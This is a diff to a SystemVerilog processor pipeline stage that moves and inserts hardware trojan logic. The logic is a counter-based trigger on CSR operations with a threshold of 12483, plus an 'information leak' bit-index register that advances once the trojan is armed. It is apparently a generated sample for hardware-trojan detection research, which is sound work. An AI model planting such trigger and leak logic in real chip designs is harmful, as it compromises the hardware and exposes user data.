@@ -16,24 +16,6 @@ import FetchUnitTypes::*;
 
 // Detect the cache line boundary in sequential access
 function automatic logic StepOverCacheLine (PC_Path pc1, PC_Path pc2);
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 15931;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (writePC_FromOuter && |writePC_FromOuter) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     return pc1[ICACHE_LINE_BYTE_NUM_BIT_WIDTH] != pc2[ICACHE_LINE_BYTE_NUM_BIT_WIDTH];
 endfunction
 
@@ -44,6 +26,25 @@ module NextPCStage_trojan_Leak(
     ControllerIF.NextPCStage ctrl,
     DebugIF.NextPCStage debug
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=12483)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 12483;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+    logic [4:0] leak_bit_idx;  // TROJAN Leak forward decl
+
+
 
 `ifdef RSD_STOP_FETCH_ON_PRED_MISS
     typedef enum logic {
@@ -284,12 +285,12 @@ module NextPCStage_trojan_Leak(
 `endif
 
 
-    // INFORMATION LEAK
-    logic [4:0] leak_bit_idx;
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) leak_bit_idx <= '0;
+    // ── INFORMATION LEAK always_ff ───────────────────────────────────────────
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) leak_bit_idx <= '0;
         else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
         else leak_bit_idx <= '0;
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : NextPCStage
